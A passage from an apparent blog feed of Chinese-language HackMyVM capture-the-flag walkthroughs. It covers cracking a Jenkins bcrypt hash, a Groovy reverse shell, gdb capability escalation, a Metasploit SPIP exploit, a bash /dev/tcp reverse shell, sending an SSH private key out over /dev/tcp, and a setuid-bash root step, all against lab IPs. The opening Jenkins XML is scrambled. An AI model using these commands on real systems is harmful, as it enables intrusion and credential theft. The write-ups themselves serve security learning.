&lt;?xml version='1.1' encoding='UTF-8'?&gt;
  &lt;idToDirectoryNameMap class=
    &lt;entry&gt;
      &lt;string&gt;an0ma1_6703692303677686036&lt;/string&gt;
  &lt;version&gt;1&lt;/version&gt;
      &lt;string&gt;an0ma1&lt;/string&gt;
&lt;/hudson.model.UserIdMapper&gt;
  &lt;/idToDirectoryNameMap&gt;
&lt;hudson.model.UserIdMapper&gt;
    &lt;/entry&gt;
file&gt; /home/penetration/.jenkins/users/an0ma1_6703692303677686036/config.xml
&lt;hudson.search.UserSearchProperty&gt;
      &lt;roles&gt;
    &lt;jenkins.security.seed.UserSeedProperty&gt;
    &lt;/hudson.search.UserSearchProperty&gt;
      &lt;/tokenStore&gt;
  &lt;properties&gt;
      &lt;flags/&gt;
    &lt;jenkins.security.LastGrantedAuthoritiesProperty&gt;
    &lt;hudson.model.MyViewsProperty&gt;
&lt;/user&gt;
  &lt;id&gt;an0ma1&lt;/id&gt;
    &lt;/jenkins.security.ApiTokenProperty&gt;
      &lt;views&gt;
    &lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=
        &lt;string&gt;authenticated&lt;/string&gt;
&lt;user&gt;
          &lt;name&gt;all&lt;/name&gt;
      &lt;collapsed/&gt;
    &lt;/jenkins.security.seed.UserSeedProperty&gt;
    &lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=
    &lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty&gt;
    &lt;/hudson.model.MyViewsProperty&gt;
      &lt;domainCredentialsMap class=
      &lt;triggers/&gt;
          &lt;filterQueue&gt;false&lt;/filterQueue&gt;
      &lt;passwordHash&gt;#jbcrypt:$2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76&lt;/passwordHash&gt;
      &lt;/views&gt;
    &lt;jenkins.security.ApiTokenProperty&gt;
    &lt;/hudson.model.PaneStatusProperties&gt;
    &lt;/hudson.tasks.Mailer_-UserProperty&gt;
      &lt;emailAddress&gt;1594743209@qq.com&lt;/emailAddress&gt;
    &lt;jenkins.console.ConsoleUrlProviderUserProperty/&gt;
        &lt;tokenList/&gt;
        &lt;/hudson.model.AllView&gt;
    &lt;/hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty&gt;
          &lt;owner class=
  &lt;/properties&gt;
      &lt;timestamp&gt;1712972655377&lt;/timestamp&gt;
    &lt;hudson.model.TimeZoneProperty/&gt;
    &lt;/jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;
    &lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty&gt;
      &lt;insensitiveSearch&gt;true&lt;/insensitiveSearch&gt;
    &lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
          &lt;properties class=
        &lt;hudson.model.AllView&gt;
    &lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
      &lt;seed&gt;e9885566be638620&lt;/seed&gt;
      &lt;providerId&gt;default&lt;/providerId&gt;
    &lt;jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;
      &lt;/roles&gt;
    &lt;/jenkins.security.LastGrantedAuthoritiesProperty&gt;
    &lt;hudson.model.PaneStatusProperties&gt;
    &lt;hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin=
&lt;?xml version='1.1' encoding='UTF-8'?&gt;
  &lt;version&gt;10&lt;/version&gt;
    &lt;hudson.tasks.Mailer_-UserProperty plugin=
          &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;
      &lt;tokenStore&gt;
    &lt;io.jenkins.plugins.thememanager.ThemeUserProperty plugin=
  &lt;fullName&gt;Mike&lt;/fullName&gt;

```

`#jbcrypt:10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76`用户的hash，破解一下

```bash
┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ echo '$2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76' &gt; hash                                  
                                                                                                                                     
┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-skylake-avx512-AMD Ryzen 9 7940H w/ Radeon 780M Graphics, 6925/13914 MB (2048 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?               

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76:369258
                                                        
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZ...smGm76
Time.Started.....: Tue Dec 31 12:59:17 2024 (30 secs)
Time.Estimated...: Tue Dec 31 12:59:47 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      172 H/s (7.45ms) @ Accel:12 Loops:8 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5040/14344385 (0.04%)
Rejected.........: 0/5040 (0.00%)
Restore.Point....: 4896/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
Candidate.Engine.: Device Generator
Candidates.#1....: FUCKYOU -&gt; twisted
Hardware.Mon.#1..: Util: 75%

Started: Tue Dec 31 12:59:13 2024
Stopped: Tue Dec 31 12:59:49 2024
                                                         
```

然后登上去弹个shell回来

Manage Jenkins --&gt; Script Console

Groovy的反弹shell，我的是这样的

```bash
String host='192.168.205.141';int port=8888;String cmd='bash';Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

回来了

```bash
┌──(kali㉿kali)-[~/test/CVE-2024-23897]
└─$ nc -lvnp 8888        
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.217] 51832
id
uid=1001(penetration) gid=1001(penetration) groups=1001(penetration)

```

## 3.**获得稳定 shell**

获得交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

## 4.提取

```bash
penetration@asd:/opt$ id
uid=1001(penetration) gid=1001(penetration) groups=1001(penetration)
penetration@asd:/opt$ sudo -l
Matching Defaults entries for penetration on asd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User penetration may run the following commands on asd:
    (ALL) NOPASSWD: /opt/babyGift/vuln

penetration@asd:/opt$ /sbin/getcap -r / 2&gt;/dev/null
/snap/core20/2264/usr/bin/ping cap_net_raw=ep
/snap/core20/2434/usr/bin/ping cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/gdb cap_setuid=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep

```

有个`/usr/bin/gdb cap_setuid=ep`可以`Capabilities`可以利用

![image](https://github.com/user-attachments/assets/c8a29b20-614e-42b1-a4a0-9ddce4ec068d)

```bash
penetration@asd:/opt$ /usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
GNU gdb (Ubuntu 13.1-2ubuntu2.1) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type 'show copying' and 'show warranty' for details.
This GDB was configured as 'x86_64-linux-gnu'.
Type 'show configuration' for configuration details.
For bug reporting instructions, please see:
&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.

For help, type 'help'.
Type 'apropos word' to search for commands related to 'word'.
# id
uid=0(root) gid=1001(penetration) groups=1001(penetration)
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_qweasd.html</guid><pubDate>Fri, 27 Jun 2025 09:33:36 +0000</pubDate></item><item><title>hmv_publisher</title><link>https://7r1UMPHK.github.io/post/hmv_publisher.html</link><description># hmv_publisher

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Leet
**难度**：绿色
**目标 IP**：192.168.205.211
**本机** IP：192.168.205.141

---

### **1. 端口枚举及服务探测**

首先，使用 `nmap` 扫描目标 IP 的开放端口，命令如下：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.211
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 11:31 CST
Nmap scan report for 192.168.205.211
Host is up (0.0012s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 08:00:27:D4:4E:10 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds
```

扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。

---

### **2. Web 服务探测与目录爆破**

对 80 端口感兴趣，访问 Web 页面，发现其是一个静态页面，包含多个锚点。使用 `whatweb` 探测：

```bash
┌──(kali㉿kali)-[~/test]
└─$ whatweb http://192.168.205.211/   
http://192.168.205.211/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.205.211], Title[Publisher's Pulse: SPIP Insights &amp; Tips]
```

单纯静态页，目录爆破吧。

使用 `gobuster` 进行目录爆破：

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.211/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,md -b 404 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.211/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/images               (Status: 301) [Size: 319] [--&gt; http://192.168.205.211/images/]
/index.html           (Status: 200) [Size: 8686]
/spip                 (Status: 301) [Size: 317] [--&gt; http://192.168.205.211/spip/]
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
Progress: 2314636 / 6369165 (36.34%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 2319486 / 6369165 (36.42%)
===============================================================
Finished
===============================================================
                                                          
```

爆破结果显示 `/images` 和 `/spip` 目录存在，并且 `/spip/` 看起来是个感兴趣的目标。

---

### **3. 利用 SPIP 远程代码执行漏洞**

访问 `http://192.168.205.211/spip/`

![image](https://github.com/user-attachments/assets/9846af83-d63f-4888-9de4-c9607030cbd3)

使用 `whatweb` 探测

```bash
┌──(kali㉿kali)-[~/test]
└─$ whatweb http://192.168.205.211/spip/   
http://192.168.205.211/spip/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.205.211], MetaGenerator[SPIP 4.2.0], SPIP[4.2.0][http://192.168.205.211/spip/local/config.txt], Script[text/javascript], Title[Publisher], UncommonHeaders[composed-by,link,x-spip-cache]

```

使用 `searchsploit` 查找相关的漏洞利用脚本：

```bash
┌──(kali㉿kali)-[~/test]
└─$ searchsploit SPIP 4.2.0                                                                                  
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
SPIP v4.2.0 - Remote Code Execution (Unauthenticated)                                                | php/webapps/51536.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                      
```

找到一个远程代码执行漏洞 (`SPIP v4.2.0 - Remote Code Execution (Unauthenticated)`),利用一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ python3 51536.py 
usage: 51536.py [-h] -u URL -c COMMAND [-v]
51536.py: error: the following arguments are required: -u/--url, -c/--command
                                                                                                                                 
┌──(kali㉿kali)-[~/test]
└─$ python3 51536.py -u http://192.168.205.211/spip/ -c id
Traceback (most recent call last):
  File '/home/kali/test/51536.py', line 63, in &lt;module&gt;
    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: module 'urllib3.util.ssl_' has no attribute 'DEFAULT_CIPHERS'
```

报错，换 Metasploit 利用该漏洞：

```bash
msfconsole
msf6 &gt; search SPIP 4.2

Matching Modules
================

   #   Name                                             Disclosure Date  Rank       Check  Description
   -   ----                                             ---------------  ----       -----  -----------
   0   exploit/multi/http/spip_bigup_unauth_rce         2024-09-06       excellent  Yes    SPIP BigUp Plugin Unauthenticated RCE
   1     \_ target: PHP In-Memory                       .                .          .      .
   2     \_ target: Unix/Linux Command Shell            .                .          .      .
   3     \_ target: Windows Command Shell               .                .          .      .
   4   exploit/multi/http/spip_porte_plume_previsu_rce  2024-08-16       excellent  Yes    SPIP Unauthenticated RCE via porte_plume Plugin
   5     \_ target: PHP In-Memory                       .                .          .      .
   6     \_ target: Unix/Linux Command Shell            .                .          .      .
   7     \_ target: Windows Command Shell               .                .          .      .
   8   exploit/multi/http/spip_rce_form                 2023-02-27       excellent  Yes    SPIP form PHP Injection
   9     \_ target: PHP In-Memory                       .                .          .      .
   10    \_ target: Unix/Linux Command Shell            .                .          .      .
   11    \_ target: Windows Command Shell               .                .          .      .


Interact with a module by name or index. For example info 11, use 11 or use exploit/multi/http/spip_rce_form
After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command Shell'

msf6 &gt; use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/spip_bigup_unauth_rce) &gt; show options 

Module options (exploit/multi/http/spip_bigup_unauth_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FORM_PAGE  Auto             yes       A page with a form.
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metas
                                         ploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Path to Spip install
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.205.141  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHP In-Memory



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/spip_bigup_unauth_rce) &gt; set RHOSTS http://192.168.205.211/spip/
RHOSTS =&gt; http://192.168.205.211/spip/
msf6 exploit(multi/http/spip_bigup_unauth_rce) &gt; run

[*] Started reverse TCP handler on 192.168.205.141:4444 
[*] Running automatic check ('set AutoCheck false' to disable)
[*] SPIP Version detected: 4.2.0
[+] SPIP version 4.2.0 is vulnerable.
[*] Bigup plugin version detected: 3.2.1
[+] The target appears to be vulnerable. Both the detected SPIP version (4.2.0) and bigup version (3.2.1) are vulnerable.
[*] Found formulaire_action: login
[*] Found formulaire_action_args: CKNCtIY6q36vgXbnqHlnO...
[*] Preparing to send exploit payload to the target...
[*] Sending stage (40004 bytes) to 192.168.205.211
[*] Meterpreter session 1 opened (192.168.205.141:4444 -&gt; 192.168.205.211:44672) at 2024-12-29 12:41:44 +0800

meterpreter &gt; shell
Process 52 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

成功获得 Meterpreter shell

---

### **4. 获得更稳定的 shell**

为了获得更稳定的 shell，创建一个反向 shell 脚本，并上传到目标机器：

```bash
cat a.sh  
bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1  
chmod +x a.sh  
bash a.sh
```

获得交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

---

### **5. 获取** **​**​**​`think`​**​**​** **用户 SSH 密钥**

访问 `/home/` 目录，发现 `think` 用户目录下的 `.ssh` 目录具有读取权限。由于本机没有 SSH 客户端，可以通过 `cat` 将私钥传输回攻击机，并登录到目标机器：

#### 目标机器：

```bash
cat id_rsa &gt; /dev/tcp/192.168.205.141/7777
```

#### 攻击机：

```bash
nc -lvnp 7777 &gt; id_rsa  
chmod 600 id_rsa  
ssh think@192.168.205.211 -i id_rsa
```

成功登录 `think` 用户：

```bash
think@publisher:~$ id  
uid=1000(think) gid=1000(think) groups=1000(think)
```

---

### **6. 使用** **​**​**​`linpeas`​**​**​** **查找提权漏洞**

将 `linpeas.sh` 脚本上传至目标机器：

```bash
think@publisher:~$ curl 192.168.205.141:8000/linpeas.sh -o /home/think/linpeas.sh  
think@publisher:~$ chmod +x linpeas.sh  
think@publisher:~$ bash linpeas.sh
```

在脚本输出中，发现一个未知的二进制文件 `/usr/sbin/run_container`，通过 `strings` 命令进行分析：

```bash
think@publisher:~$ strings /usr/sbin/run_container
/lib64/ld-linux-x86-64.so.2
libc.so.6
__stack_chk_fail
execve
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
GLIBC_2.4
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
/bin/bash
/opt/run_container.sh
:*3$'
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
run_container.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
__stack_chk_fail@@GLIBC_2.4
__libc_start_main@@GLIBC_2.2.5
execve@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

发现该二进制文件似乎与 `/bin/bash`、`/opt/run_container.sh`，似乎是使用bash运行`/opt/run_container.sh`。但是当我查看`/opt/run_container.sh`时发现我没有`/opt/`目录的访问权限，然后就歇b了，实在做不出来我就去看其他师傅的wp了，看的是`ll104567`和`HGBE`两位师傅的wp,发现当前使用的是`受限外壳`,需要绕过。

---

### **7. 提权为 root**

通过动态链接库生成 `bash` shell 来提权。首先，加载 `bash` 所需的共享库：

```bash
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash
```

运行 `/usr/sbin/run_container`让它触发执行`/opt/run_container.sh`，并修改`/opt/run_container.sh`脚本：

```bash
think@publisher:~$ echo '#!/bin/bash' &gt; /opt/run_container.sh
think@publisher:~$ echo 'chmod +s /bin/bash' &gt;&gt; /opt/run_container.sh
think@publisher:~$/usr/sbin/run_container
think@publisher:~$ cat /opt/run_container.sh
#!/bin/bash  
chmod +s /bin/bash  
```

然后使用 `bash -p` 提升权限为 root：

```bash
think@publisher:~$ bash -p  
bash-5.0# id 
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
```

---

成功获取 root 权限后，已完全控制目标系统。

### 参考

[HGBE](https://hgbe02.github.io/Hackmyvm/publisher.html)

[ll104567](https://www.bilibili.com/video/BV1TM4m1U7y4/)

[voltage](https://vishal-chandak.medium.com/hackmyvm-publisher-4a5033fce95d)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_publisher.html</guid><pubDate>Fri, 27 Jun 2025 09:33:34 +0000</pubDate></item><item><title>hmv_Principle2</title><link>https://7r1UMPHK.github.io/post/hmv_Principle2.html</link><description># hmv_Principle2

# 0.简介

**靶机**：[hackmyvm - Principle2](https://hackmyvm.eu/machines/machine.php?vm=Principle2)
**难度**：黄色
**目标 IP**：192.168.205.247
**本机 IP**：192.168.205.141

---

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sT --min-rate 10000 -p- -Pn 192.168.205.247
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 10:45 CST
Nmap scan report for thetruthoftalos.hmv (192.168.205.247)
Host is up (0.00075s latency).
Not shown: 63482 closed tcp ports (conn-refused), 2043 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
35659/tcp open  unknown
42607/tcp open  unknown
43239/tcp open  unknown
43401/tcp open  unknown
46365/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
                                                                   
```

其中80，111，139，445，2049端口我们比较感兴趣，但是我先看smb服务，因为我怕他整幺蛾子

---

# 2.踩点

## prot 445

ps:它这个smb服务不知道是它靶机有幺蛾子还是我攻击机有幺蛾子，我用不了smbmap，而且我用smbclient访问目录有概率失败，如果你复现失败的话，多试几次

```bash
┌──(kali㉿kali)-[~/test]
└─$ smbclient //192.168.205.247/public
Password for [WORKGROUP\kali]:
Try 'help' to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Tue Nov 28 19:57:45 2023
  ..                                  D        0  Sun Nov 26 00:19:40 2023
  new_era.txt                         N      158  Sun Nov 19 20:01:00 2023
  straton.txt                         N      718  Sun Nov 19 20:00:24 2023
  loyalty.txt                         N      931  Sun Nov 19 20:01:07 2023

                19962704 blocks of size 1024. 17182940 blocks available
smb: \&gt; get new_era.txt
getting file \new_era.txt of size 158 as new_era.txt (77.1 KiloBytes/sec) (average 77.1 KiloBytes/sec)
smb: \&gt; get straton.txt
getting file \straton.txt of size 718 as straton.txt (350.6 KiloBytes/sec) (average 213.9 KiloBytes/sec)
smb: \&gt; get loyalty.txt
getting file \loyalty.txt of size 931 as loyalty.txt (454.6 KiloBytes/sec) (average 294.1 KiloBytes/sec)
smb: \&gt; exit
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat new_era.txt                   
Yesterday there was a big change, new government, new mayor. All citizens were reassigned their tasks. For security, every user should change their password.
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat straton.txt
This fragment from Straton's On the Universe appears to have been of great significance both to the Progenitor and to the Founder.

AMYNTAS:        But what does this tell us about the nature of the universe, which is what we were discussing?
STRATON:        That is the next question we must undertake to answer. We begin with the self because that is what determines our existence as individuals; but the self cannot exist without that which surrounds it. The citizen lives within the city; and the city lives within the cosmos. So now we must apply the principle we have discovered to the wider world, and ask: if man is like a machine, could it be that the universe is similar in nature? And if so, what follows from that fact?
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat loyalty.txt
This text was the source of considerable controversy in a debate between Byron (7) and Hermanubis (452).

What I propose, then, is that we are not born as entirely free agents, responsible only for ourselves. The very core of what we are, our sentience, separates us from and elevates us above the animal kingdom. As I have argued, this is not a matter of arrogance, but of responsibility.

2257686f2061726520796f752c207468656e3f22

To put it simply: each of us owes a burden of loyalty to humanity itself, to the human project across time and space. This is not a minor matter, or some abstract issue for philosophers. It is a profound and significant part of every human life. It is a universal source of meaning and insight that can bind us together and set us on a path for a brighter future; and it is also a division, a line that must held against those who preach the gospel of self-annihilation. We ignore it at our peril.
                                                                                                                                     

# new_era.txt翻译
昨天发生了重大变化，新政府，新市长。所有公民都重新分配了任务。为了安全起见，每个用户都应该更改密码。

# straton.txt翻译
斯特拉顿的《论宇宙》中的这段片段似乎对祖先和创始人都具有重大意义。

阿米塔斯：但是，这告诉我们有关宇宙本质的什么，也就是我们正在讨论的？
斯特拉顿：这是我们必须回答的下一个问题。我们从自我开始，因为自我决定了我们作为个体的存在；但是，如果没有周围的事物，自我就无法存在。公民生活在城市中；城市生活在宇宙中。所以现在我们必须将我们发现的原理应用到更广阔的世界，并问：如果人就像一台机器，那么宇宙的本质是否也类似？如果是这样，从这个事实中可以得出什么结论？

# loyalty.txt翻译
这段文字在拜伦 (7) 和赫尔曼努比斯 (452) 的辩论中引起了相当大的争议。

因此，我认为，我们并非生来就是完全自由的个体，只对自己负责。我们存在的核心，我们的知觉，将我们与动物王国区分开来，并使我们高于动物王国。正如我所说，这不是傲慢的问题，而是责任的问题。

2257686f2061726520796f752c207468656e3f22

简而言之：我们每个人都对人类本身、对跨越时空的人类项目负有忠诚的义务。这不是一件小事，也不是哲学家的抽象问题。它是每个人生命中深刻而重要的一部分。它是意义和洞察力的普遍源泉，可以将我们团结在一起，为我们铺平通往更光明未来的道路；这也是一条分界线，一条必须与那些宣扬自我毁灭福音的人划清的界线。我们忽视它，后果自负。
```

其中密码为**空。**  我们比较感兴趣的是那串像密码一样的字符串。smb服务就可以告一段落了

---

## prot 80

80端口是Apache2的初始页，并且它大小为常规大小`10701`，那我们爆破目录

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.247 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.247
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
Progress: 110804 / 311425 (35.58%)[ERROR] parse 'http://192.168.205.247/besalu\t.php': net/url: invalid control character in URL
[ERROR] parse 'http://192.168.205.247/besalu\t.html': net/url: invalid control character in URL
[ERROR] parse 'http://192.168.205.247/besalu\t.txt': net/url: invalid control character in URL
[ERROR] parse 'http://192.168.205.247/besalu\t.md': net/url: invalid control character in URL
/index.html           (Status: 200) [Size: 10701]
Progress: 311420 / 311425 (100.00%)
===============================================================
Finished
===============================================================
                                                                            
```

无果，告一段落

---

## prot 111

因为我没有打过这个服务，我就去[hacktricks](https://book.hacktricks.wiki/)搜索了一下

**资料**：https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-rpcbind.html#bypass-filtered-portmapper-port

![image](https://github.com/user-attachments/assets/ceb202ec-7121-4628-8b32-5830b2dd5f65)

阅读文本，我们可以发现它和NFS衔接，我们刚好有NFS

**资料**：https://book.hacktricks.wiki/zh/network-services-pentesting/nfs-service-pentesting.html

查看挂载

```bash
┌──(kali㉿kali)-[~/test]
